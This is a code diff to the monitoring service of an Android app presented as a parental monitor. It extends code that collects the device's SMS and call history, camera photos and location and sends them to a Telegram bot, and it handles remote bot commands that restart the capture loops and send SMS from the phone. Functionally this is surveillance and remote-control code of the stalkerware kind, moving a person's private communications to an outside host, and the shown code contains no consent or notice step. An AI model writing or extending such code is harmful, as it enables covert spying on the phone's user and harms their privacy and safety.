@@ -11,6 +11,7 @@ import com.redeye.parentalmonitor.R
 import com.redeye.parentalmonitor.data.MessageQueue
 import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.network.TelegramClient
+import com.redeye.parentalmonitor.network.TelegramMediaClient
 import com.redeye.parentalmonitor.network.TelegramMessage
 import com.redeye.parentalmonitor.utils.CrashReporter
 import com.redeye.parentalmonitor.utils.Html
@@ -132,8 +133,6 @@ class MonitoringService : Service() {
             }.start()
         } catch (_: Exception) {
         }
-        refreshCreds()
-        refreshLoopConfig()
         credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
             if (key == PreferencesManager.KEY_BOT_TOKEN || key == PreferencesManager.KEY_CHAT_ID) refreshCreds()
             if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL || key == PreferencesManager.KEY_SYNC_INTERVAL) refreshLoopConfig()
@@ -703,7 +702,11 @@ class MonitoringService : Service() {
                         if (command.startsWith("/")) {
                             val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
-                            handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk)
+                            val wakeSeen = command == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
+                            handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, wakeSeen)
+                            if (wakeSeen) {
+                                try { preferencesManager.removeWakePingId(update.updateId) } catch (_: Exception) { }
+                            }
                         }
                     }
                 }
@@ -830,26 +833,42 @@ class MonitoringService : Service() {
         )
     }
 
+    private fun publicCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
+        return listOf(
+            com.redeye.parentalmonitor.network.BotCommand("ping", "Check delay"),
+            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
+        )
+    }
+
     private suspend fun registerBotCommands() {
         try {
             val botToken = preferencesManager.botToken
             if (botToken.isEmpty()) return
-            val tokenHash = sha256Hex(botToken)
+            val ownerId = try { preferencesManager.ownerUserId } catch (_: Exception) { 0L }
+            val tokenHash = sha256Hex(botToken + ":" + ownerId)
             try {
                 if (preferencesManager.commandsTokenHash == tokenHash) return
             } catch (_: Exception) {
             }
             val url = "https://api.telegram.org/bot$botToken/setMyCommands"
-            val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
-            val response = TelegramClient.api.setMyCommands(url, body)
-            if (response.isSuccessful && response.body()?.ok == true) {
+            val publicResp = TelegramClient.api.setMyCommands(url, com.redeye.parentalmonitor.network.SetMyCommandsRequest(publicCommandList()))
+            var ownerOk = true
+            if (ownerId != 0L) {
+                val ownerBody = com.redeye.parentalmonitor.network.SetMyCommandsRequest(
+                    botCommandList(),
+                    com.redeye.parentalmonitor.network.BotCommandScope("bot_command_scope_chat", ownerId)
+                )
+                val ownerResp = TelegramClient.api.setMyCommands(url, ownerBody)
+                ownerOk = ownerResp.isSuccessful && ownerResp.body()?.ok == true
+            }
+            if (publicResp.isSuccessful && publicResp.body()?.ok == true && ownerOk) {
                 try {
                     preferencesManager.commandsTokenHash = tokenHash
                 } catch (_: Exception) {
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
             } else {
-                android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
+                android.util.Log.w("MonitoringService", "Command menu registration failed: ${publicResp.code()}")
             }
         } catch (e: Exception) {
             android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
@@ -870,7 +889,7 @@ class MonitoringService : Service() {
         )
     }
 
-    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false) {
+    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false) {
         val nowSec = System.currentTimeMillis() / 1000L
         if (sentAtSec > 0 && nowSec - sentAtSec > COMMAND_MAX_AGE_SEC) {
             serviceScope.launch {
@@ -887,7 +906,7 @@ class MonitoringService : Service() {
         val command = parts[0]
         val arg = parts.getOrNull(1)?.trim().orEmpty()
         try {
-            handleTelegramCommandInner(command, arg, sentAtSec, senderOk, chatOk)
+            handleTelegramCommandInner(command, arg, sentAtSec, senderOk, chatOk, wakeSeen)
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
@@ -900,7 +919,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false) {
+    private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false) {
         if (sentAtSec > 0 && command in MUTATING_COMMANDS) {
             val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
             if (ageSec > 300L) {
@@ -1181,7 +1200,7 @@ class MonitoringService : Service() {
             "/ping" -> {
                 when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                     "camera", "photo" -> {
-                        if (senderOk) restartCameraLoop()
+                        if (senderOk && !wakeSeen) restartCameraLoop()
                         handleTelegramCommand("/photo", sentAtSec, senderOk, chatOk)
                     }
                     "location", "loc", "gps" -> {
@@ -1189,8 +1208,8 @@ class MonitoringService : Service() {
                     }
                     "" -> {
                         val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true
-                        if (!loopsOk && senderOk) restartAllLoops()
-                        val tail = if (loopsOk || !senderOk) "" else " ⏰ Loops restarted."
+                        if (!loopsOk && senderOk && !wakeSeen) restartAllLoops()
+                        val tail = if (loopsOk || !senderOk || wakeSeen) "" else " ⏰ Loops restarted."
                         if (sentAtSec > 0) {
                             val lag = System.currentTimeMillis() / 1000L - sentAtSec
                             sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail)
@@ -1570,21 +1589,43 @@ class MonitoringService : Service() {
     private suspend fun sendInitialData() {
         try {
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
-            // Get all history first
-            val allSms = smsRepository.getRecentSms(100)
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
-            
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
-            val allCalls = callLogRepository.getAllCalls(100)
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
-
             val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
-            val pendingSms = allSms.filter { it.id > entrySmsId }.sortedBy { it.id }
+            val pendingSms = mutableListOf<com.redeye.parentalmonitor.data.models.SmsData>()
+            var smsCursor = entrySmsId
+            var smsPages = 0
+            while (smsPages < 5) {
+                val page = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) { emptyList() }
+                if (page.isEmpty()) break
+                pendingSms.addAll(page)
+                smsCursor = page.maxOf { it.id }
+                smsPages++
+                if (page.size < 100) break
+            }
+            pendingSms.sortBy { it.id }
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${pendingSms.size} SMS messages")
+
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
             val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
             val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
-            val pendingCalls = allCalls.filter { it.date > entryCallTs || (it.date == entryCallTs && it.id > entryCallId) }.sortedWith(compareBy({ it.date }, { it.id }))
+            val pendingCalls = mutableListOf<com.redeye.parentalmonitor.data.models.CallData>()
+            var callTs = entryCallTs
+            var callId = entryCallId
+            var callPages = 0
+            while (callPages < 5) {
+                val page = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) { emptyList() }
+                if (page.isEmpty()) break
+                pendingCalls.addAll(page)
+                val latest = page.maxWith(compareBy({ it.date }, { it.id }))
+                callTs = latest.date
+                callId = latest.id
+                callPages++
+                if (page.size < 100) break
+            }
+            pendingCalls.sortWith(compareBy({ it.date }, { it.id }))
             if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
+                val wasDone = try { preferencesManager.initialSyncDone } catch (_: Exception) { true }
                 preferencesManager.initialSyncDone = true
+                if (!wasDone) sendToTelegram("Monitoring started. No SMS or call history on this device yet.")
                 return
             }
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
@@ -1594,8 +1635,8 @@ class MonitoringService : Service() {
                 appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                 appendLine()
                 appendLine("📊 Found on device:")
-                appendLine("• SMS: ${allSms.size}")
-                appendLine("• Calls: ${allCalls.size}")
+                appendLine("• SMS: ${pendingSms.size}")
+                appendLine("• Calls: ${pendingCalls.size}")
                 appendLine()
                 appendLine("Sending history...")
             }
@@ -1720,8 +1761,10 @@ class MonitoringService : Service() {
             }
             val smsPage = smsRepository.getNewSms(lastSms).take(100)
             if (smsPage.isNotEmpty()) {
-                sendFitted(formatSmsMessage(smsPage))
-                preferencesManager.lastSmsId = maxOf(lastSms, smsPage.maxOf { it.id })
+                if (sendFitted(formatSmsMessage(smsPage))) {
+                    preferencesManager.lastSmsId = maxOf(lastSms, smsPage.maxOf { it.id })
+                    try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
+                }
             }
             val lastCallTs = try {
                 preferencesManager.lastCallTimestamp
@@ -1735,13 +1778,15 @@ class MonitoringService : Service() {
             }
             val callPage = callLogRepository.getNewCalls(lastCallTs, lastCallId).take(100)
             if (callPage.isNotEmpty()) {
-                sendFitted(formatCallMessage(callPage))
-                val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
-                if (latest.date > lastCallTs ||
-                    (latest.date == lastCallTs && latest.id > lastCallId)
-                ) {
-                    preferencesManager.lastCallTimestamp = latest.date
-                    preferencesManager.lastCallId = latest.id
+                if (sendFitted(formatCallMessage(callPage))) {
+                    val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
+                    if (latest.date > lastCallTs ||
+                        (latest.date == lastCallTs && latest.id > lastCallId)
+                    ) {
+                        preferencesManager.lastCallTimestamp = latest.date
+                        preferencesManager.lastCallId = latest.id
+                    }
+                    try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                 }
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -1863,8 +1908,8 @@ class MonitoringService : Service() {
                     smsManager.sendTextMessage(number, null, smsText, sentIntent, null)
                 }
                 val confirmed = withTimeoutOrNull(60_000L) { delivered.await() } ?: false
-                preferencesManager.lastSmsSendAt = System.currentTimeMillis()
                 if (confirmed) {
+                    preferencesManager.lastSmsSendAt = System.currentTimeMillis()
                     preferencesManager.pendingSmsNumber = ""
                     preferencesManager.pendingSmsText = ""
                     preferencesManager.pendingSmsAt = 0L
@@ -2015,7 +2060,6 @@ class MonitoringService : Service() {
 
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
-                preferencesManager.lastSyncTime = System.currentTimeMillis()
                 try {
                     preferencesManager.credentialError = ""
                     preferencesManager.credentialErrorAt = 0L
@@ -2056,7 +2100,6 @@ class MonitoringService : Service() {
                         val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
                         val fallbackResp = TelegramClient.api.sendMessage(fallbackUrl, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
                         if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
-                            preferencesManager.lastSyncTime = System.currentTimeMillis()
                             try {
                                 preferencesManager.credentialError = ""
                                 preferencesManager.credentialErrorAt = 0L
@@ -2224,6 +2267,15 @@ class MonitoringService : Service() {
         }
         try {
             loopWatchdogJob?.cancel()
+        } catch (_: Exception) {
+        }
+        try {
+            watchdogJob?.cancel()
+        } catch (_: Exception) {
+        }
+        cameraBusy.set(false)
+        try {
+            cameraService.forceReset()
         } catch (_: Exception) {
         }
         initialSyncRunning.set(false)
@@ -2981,6 +3033,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun flushPendingPhotos(max: Int = 10) {
+        if (authBlocked()) return
         if (!photoFlushBusy.compareAndSet(false, true)) return
         try {
             val pending = try {
